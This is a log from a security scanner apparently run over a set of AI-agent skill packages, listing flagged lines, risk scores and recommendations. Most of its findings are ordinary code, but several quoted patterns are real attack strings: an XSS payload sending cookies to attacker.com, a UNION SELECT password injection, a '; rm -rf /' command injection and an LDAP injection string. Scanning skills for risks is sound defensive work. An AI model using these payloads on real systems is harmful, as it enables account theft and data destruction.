  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/error-explanation-generator.json
Scanning: exploitability-analyzer

[*] Scanning Skill: exploitability-analyzer

[?] Risk Level: LOW (2.7/10)

[!] CRITICAL Issues (5):
  [NET001] in exploitability-analyzer/SKILL.md:318
    Pattern: GET /search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)<...
    Confidence: LOW
  [FILE001] in exploitability-analyzer/SKILL.md:168
    Pattern: GET /user?username=' UNION SELECT password FROM admin_users --
    Confidence: MEDIUM
  [FILE001] in exploitability-analyzer/SKILL.md:171
    Pattern: This extracts admin passwords.
    Confidence: MEDIUM
  [FILE002] in exploitability-analyzer/references/assessment_criteria.md:184
    Pattern: **Exploit**: `; rm -rf /` executes arbitrary commands
    Confidence: HIGH
  [CMD001] in exploitability-analyzer/references/assessment_criteria.md:184
    Pattern: **Exploit**: `; rm -rf /` executes arbitrary commands
    Confidence: HIGH

[*] WARNING Issues (4):
  [CMD002] in exploitability-analyzer/SKILL.md:193
    Pattern: result = os.system(f"ping -c 4 {host}")
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/SKILL.md:204
    Pattern: - **Sink**: `os.system()` - shell command execution
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/references/assessment_criteria.md:174
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/references/assessment_criteria.md:193
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 5
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/exploitability-analyzer.html
Scanning: exploitability-analyzer

[*] Scanning Skill: exploitability-analyzer

[?] Risk Level: LOW (2.7/10)

[!] CRITICAL Issues (5):
  [NET001] in exploitability-analyzer/SKILL.md:318
    Pattern: GET /search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)<...
    Confidence: LOW
  [FILE001] in exploitability-analyzer/SKILL.md:168
    Pattern: GET /user?username=' UNION SELECT password FROM admin_users --
    Confidence: MEDIUM
  [FILE001] in exploitability-analyzer/SKILL.md:171
    Pattern: This extracts admin passwords.
    Confidence: MEDIUM
  [FILE002] in exploitability-analyzer/references/assessment_criteria.md:184
    Pattern: **Exploit**: `; rm -rf /` executes arbitrary commands
    Confidence: HIGH
  [CMD001] in exploitability-analyzer/references/assessment_criteria.md:184
    Pattern: **Exploit**: `; rm -rf /` executes arbitrary commands
    Confidence: HIGH

[*] WARNING Issues (4):
  [CMD002] in exploitability-analyzer/SKILL.md:193
    Pattern: result = os.system(f"ping -c 4 {host}")
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/SKILL.md:204
    Pattern: - **Sink**: `os.system()` - shell command execution
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/references/assessment_criteria.md:174
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM
  [CMD002] in exploitability-analyzer/references/assessment_criteria.md:193
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 5
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/exploitability-analyzer.json
Scanning: failure-oriented-instrumentation

[*] Scanning Skill: failure-oriented-instrumentation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in failure-oriented-instrumentation/SKILL.md:228
    Pattern: - Security-sensitive operations (passwords, tokens)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/failure-oriented-instrumentation.html
Scanning: failure-oriented-instrumentation

[*] Scanning Skill: failure-oriented-instrumentation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in failure-oriented-instrumentation/SKILL.md:228
    Pattern: - Security-sensitive operations (passwords, tokens)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/failure-oriented-instrumentation.json
Scanning: flaky-test-detector

[*] Scanning Skill: flaky-test-detector

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (9):
  [NET001] in flaky-test-detector/SKILL.md:63
    Pattern: - `requests.get()`, `http.client` - Real network calls
    Confidence: MEDIUM
  [NET001] in flaky-test-detector/SKILL.md:213
    Pattern: - Line 23: requests.get() - unmocked network call
    Confidence: MEDIUM
  [NET001] in flaky-test-detector/references/remediation-strategies.md:197
    Pattern: response = requests.get("https://api.example.com/data")
    Confidence: LOW
  [NET001] in flaky-test-detector/references/remediation-strategies.md:207
    Pattern: response = requests.get("https://api.example.com/data")
    Confidence: LOW
  [NET001] in flaky-test-detector/references/flaky-patterns.md:111
    Pattern: response = requests.get('https://api.example.com/data')
    Confidence: LOW
  [NET001] in flaky-test-detector/references/flaky-patterns.md:117
    Pattern: response = requests.get('https://api.example.com/data')
    Confidence: LOW
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:265
    Pattern: assert os.getenv('API_KEY') == 'expected-key'
    Confidence: MEDIUM
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:269
    Pattern: monkeypatch.setenv('API_KEY', 'expected-key')
    Confidence: MEDIUM
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:270
    Pattern: assert os.getenv('API_KEY') == 'expected-key'
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/flaky-test-detector.html
Scanning: flaky-test-detector

[*] Scanning Skill: flaky-test-detector

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (9):
  [NET001] in flaky-test-detector/SKILL.md:63
    Pattern: - `requests.get()`, `http.client` - Real network calls
    Confidence: MEDIUM
  [NET001] in flaky-test-detector/SKILL.md:213
    Pattern: - Line 23: requests.get() - unmocked network call
    Confidence: MEDIUM
  [NET001] in flaky-test-detector/references/remediation-strategies.md:197
    Pattern: response = requests.get("https://api.example.com/data")
    Confidence: LOW
  [NET001] in flaky-test-detector/references/remediation-strategies.md:207
    Pattern: response = requests.get("https://api.example.com/data")
    Confidence: LOW
  [NET001] in flaky-test-detector/references/flaky-patterns.md:111
    Pattern: response = requests.get('https://api.example.com/data')
    Confidence: LOW
  [NET001] in flaky-test-detector/references/flaky-patterns.md:117
    Pattern: response = requests.get('https://api.example.com/data')
    Confidence: LOW
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:265
    Pattern: assert os.getenv('API_KEY') == 'expected-key'
    Confidence: MEDIUM
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:269
    Pattern: monkeypatch.setenv('API_KEY', 'expected-key')
    Confidence: MEDIUM
  [FILE001] in flaky-test-detector/references/flaky-patterns.md:270
    Pattern: assert os.getenv('API_KEY') == 'expected-key'
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/flaky-test-detector.json
Scanning: formal-spec-generator

[*] Scanning Skill: formal-spec-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/formal-spec-generator.html
Scanning: formal-spec-generator

[*] Scanning Skill: formal-spec-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/formal-spec-generator.json
Scanning: framework-migration-assistant

[*] Scanning Skill: framework-migration-assistant

[!] Risk Level: CRITICAL (9.4/10)

[!] CRITICAL Issues (21):
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:141
    Pattern: token = request.headers.get('Authorization')
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:142
    Pattern: if not token:
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:144
    Pattern: user = verify_token(token)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:156
    Pattern: user = await verify_token(authorization)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:195
    Pattern: password = request.form.get('password')
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:196
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:197
    Pattern: return jsonify({'token': user.token})
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:207
    Pattern: password: str = Form(...)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:209
    Pattern: user = await authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:210
    Pattern: return {'token': user.token}
    Confidence: MEDIUM
  and 11 more

[*] Summary:
  Total Files Scanned: 11
  Critical Issues: 21
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 21

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/framework-migration-assistant.html
Scanning: framework-migration-assistant

[*] Scanning Skill: framework-migration-assistant

[!] Risk Level: CRITICAL (9.4/10)

[!] CRITICAL Issues (21):
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:141
    Pattern: token = request.headers.get('Authorization')
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:142
    Pattern: if not token:
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:144
    Pattern: user = verify_token(token)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:156
    Pattern: user = await verify_token(authorization)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:195
    Pattern: password = request.form.get('password')
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:196
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:197
    Pattern: return jsonify({'token': user.token})
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:207
    Pattern: password: str = Form(...)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:209
    Pattern: user = await authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in framework-migration-assistant/references/migration_patterns.md:210
    Pattern: return {'token': user.token}
    Confidence: MEDIUM
  and 11 more

[*] Summary:
  Total Files Scanned: 11
  Critical Issues: 21
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 21

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/framework-migration-assistant.json
Scanning: function-class-generator

[*] Scanning Skill: function-class-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/function-class-generator.html
Scanning: function-class-generator

[*] Scanning Skill: function-class-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/function-class-generator.json
Scanning: fuzzing-input-generator

[*] Scanning Skill: fuzzing-input-generator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in fuzzing-input-generator/references/fuzzing-patterns.md:360
    Pattern: "admin)(&(password=*)"
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/fuzzing-input-generator.html
Scanning: fuzzing-input-generator

[*] Scanning Skill: fuzzing-input-generator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in fuzzing-input-generator/references/fuzzing-patterns.md:360
    Pattern: "admin)(&(password=*)"
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/fuzzing-input-generator.json
Scanning: git-bisect-assistant

[*] Scanning Skill: git-bisect-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/git-bisect-assistant.html
Scanning: git-bisect-assistant

[*] Scanning Skill: git-bisect-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/git-bisect-assistant.json
Scanning: imperative-to-coq-model-extractor

[*] Scanning Skill: imperative-to-coq-model-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/imperative-to-coq-model-extractor.html
Scanning: imperative-to-coq-model-extractor

[*] Scanning Skill: imperative-to-coq-model-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/imperative-to-coq-model-extractor.json
Scanning: incremental-java-programmer

[*] Scanning Skill: incremental-java-programmer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/incremental-java-programmer.html
Scanning: incremental-java-programmer

[*] Scanning Skill: incremental-java-programmer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/incremental-java-programmer.json
Scanning: incremental-python-programmer

[*] Scanning Skill: incremental-python-programmer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/incremental-python-programmer.html
Scanning: incremental-python-programmer

[*] Scanning Skill: incremental-python-programmer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/incremental-python-programmer.json
Scanning: integration-test-generator

[*] Scanning Skill: integration-test-generator

[?] Risk Level: LOW (2.3/10)

[!] CRITICAL Issues (6):
  [FILE001] in integration-test-generator/SKILL.md:147
    Pattern: result = payment_service.charge(amount=99.99, card_token="tok_test")
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:24
    Pattern: response = requests.post(f"{base_url}/users", json=user_data)
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:30
    Pattern: requests.delete(f"{base_url}/users/{user_id}")
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:42
    Pattern: response = requests.post(f"{base_url}/orders", json=order_data)
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:51
    Pattern: user_response = requests.get(f"{base_url}/users/{test_user}/orders")
    Confidence: MEDIUM
  [FILE001] in integration-test-generator/references/patterns.md:366
    Pattern: card_token="tok_test"
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/integration-test-generator.html
Scanning: integration-test-generator

[*] Scanning Skill: integration-test-generator

[?] Risk Level: LOW (2.3/10)

[!] CRITICAL Issues (6):
  [FILE001] in integration-test-generator/SKILL.md:147
    Pattern: result = payment_service.charge(amount=99.99, card_token="tok_test")
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:24
    Pattern: response = requests.post(f"{base_url}/users", json=user_data)
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:30
    Pattern: requests.delete(f"{base_url}/users/{user_id}")
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:42
    Pattern: response = requests.post(f"{base_url}/orders", json=order_data)
    Confidence: MEDIUM
  [NET001] in integration-test-generator/references/patterns.md:51
    Pattern: user_response = requests.get(f"{base_url}/users/{test_user}/orders")
    Confidence: MEDIUM
  [FILE001] in integration-test-generator/references/patterns.md:366
    Pattern: card_token="tok_test"
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/integration-test-generator.json
Scanning: interface-contract-verifier

[*] Scanning Skill: interface-contract-verifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/interface-contract-verifier.html
Scanning: interface-contract-verifier

[*] Scanning Skill: interface-contract-verifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/interface-contract-verifier.json
Scanning: interface-specification-generator

[*] Scanning Skill: interface-specification-generator

[?] Risk Level: MEDIUM (5.6/10)

[!] CRITICAL Issues (13):
  [FILE001] in interface-specification-generator/references/validation-rules.md:53
    Pattern: ### Password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/validation-rules.md:56
    Pattern: format: password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:309
    Pattern: ### Bearer Token (JWT)
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:335
    Pattern: - password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:340
    Pattern: password:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:342
    Pattern: format: password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:351
    Pattern: token:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:353
    Pattern: refreshToken:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:364
    Pattern: apiKey:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:365
    Pattern: type: apiKey
    Confidence: MEDIUM
  and 3 more

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/interface-specification-generator.html
Scanning: interface-specification-generator

[*] Scanning Skill: interface-specification-generator

[?] Risk Level: MEDIUM (5.6/10)

[!] CRITICAL Issues (13):
  [FILE001] in interface-specification-generator/references/validation-rules.md:53
    Pattern: ### Password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/validation-rules.md:56
    Pattern: format: password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:309
    Pattern: ### Bearer Token (JWT)
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:335
    Pattern: - password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:340
    Pattern: password:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:342
    Pattern: format: password
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:351
    Pattern: token:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:353
    Pattern: refreshToken:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:364
    Pattern: apiKey:
    Confidence: MEDIUM
  [FILE001] in interface-specification-generator/references/openapi-patterns.md:365
    Pattern: type: apiKey
    Confidence: MEDIUM
  and 3 more

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/interface-specification-generator.json
Scanning: interval-difference-analyzer

[*] Scanning Skill: interval-difference-analyzer

[OK] Risk Level: SAFE (1.8/10)

[!] CRITICAL Issues (3):
  [INJ001] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [FILE001] in interval-difference-analyzer/scripts/compare_intervals.py:44
    Pattern: old_vars = set(old_intervals.keys())
    Confidence: MEDIUM
  [FILE001] in interval-difference-analyzer/scripts/compare_intervals.py:45
    Pattern: new_vars = set(new_intervals.keys())
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [OBF001] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [OBF002] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 3
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/interval-difference-analyzer.html
Scanning: interval-difference-analyzer

[*] Scanning Skill: interval-difference-analyzer

[OK] Risk Level: SAFE (1.8/10)

[!] CRITICAL Issues (3):
  [INJ001] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [FILE001] in interval-difference-analyzer/scripts/compare_intervals.py:44
    Pattern: old_vars = set(old_intervals.keys())
    Confidence: MEDIUM
  [FILE001] in interval-difference-analyzer/scripts/compare_intervals.py:45
    Pattern: new_vars = set(new_intervals.keys())
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [OBF001] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM
  [OBF002] in interval-difference-analyzer/references/abstract_interpretation.md:230
    Pattern: abstract_state[x] = eval(e, abstract_state)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 3
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/interval-difference-analyzer.json
Scanning: interval-guided-regression-test-update

[*] Scanning Skill: interval-guided-regression-test-update

[?] Risk Level: LOW (2.4/10)

[!] CRITICAL Issues (6):
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:317
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:318
    Pattern: if len(password) < 8:
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:320
    Pattern: elif len(password) > 20:
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:331
    Pattern: assert validate_password("abc") == "too short"      # Interval 1
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:332
    Pattern: assert validate_password("password123") == "valid"  # Interval 2
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:333
    Pattern: assert validate_password("a" * 25) == "too long"    # Interval 3
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/interval-guided-regression-test-update.html
Scanning: interval-guided-regression-test-update

[*] Scanning Skill: interval-guided-regression-test-update

[?] Risk Level: LOW (2.4/10)

[!] CRITICAL Issues (6):
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:317
    Pattern: def validate_password(password):
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:318
    Pattern: if len(password) < 8:
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:320
    Pattern: elif len(password) > 20:
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:331
    Pattern: assert validate_password("abc") == "too short"      # Interval 1
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:332
    Pattern: assert validate_password("password123") == "valid"  # Interval 2
    Confidence: MEDIUM
  [FILE001] in interval-guided-regression-test-update/references/interval-analysis.md:333
    Pattern: assert validate_password("a" * 25) == "too long"    # Interval 3
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/interval-guided-regression-test-update.json
Scanning: interval-profiling-performance-analyzer

[*] Scanning Skill: interval-profiling-performance-analyzer

[?] Risk Level: MEDIUM (4.4/10)

[!] CRITICAL Issues (9):
  [CMD001] in interval-profiling-performance-analyzer/SKILL.md:160
    Pattern: - May need `sudo` for system-wide profiling
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/SKILL.md:176
    Pattern: sudo apt-get install linux-tools-generic
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:98
    Pattern: **Installation:** `sudo apt-get install linux-tools-generic`
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:126
    Pattern: **Installation:** `sudo apt-get install valgrind`
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:165
    Pattern: 4. **Disable frequency scaling:** `sudo cpupower frequency-set --governor per...
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/scripts/profile_cpp.py:38
    Pattern: print("Error: perf not found. Install with: sudo apt-get install linux-tools-...
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/scripts/profile_cpp.py:103
    Pattern: print("Error: gprof not found. Install with: sudo apt-get install binutils")
    Confidence: MEDIUM
  [INJ001] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [INJ001] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM

[*] WARNING Issues (7):
  [CMD002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [INJ002] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [INJ002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [OBF001] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [OBF001] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [OBF002] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [OBF002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 9
  Warning Issues: 7
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/interval-profiling-performance-analyzer.html
Scanning: interval-profiling-performance-analyzer

[*] Scanning Skill: interval-profiling-performance-analyzer

[?] Risk Level: MEDIUM (4.4/10)

[!] CRITICAL Issues (9):
  [CMD001] in interval-profiling-performance-analyzer/SKILL.md:160
    Pattern: - May need `sudo` for system-wide profiling
    Confidence: MEDIUM
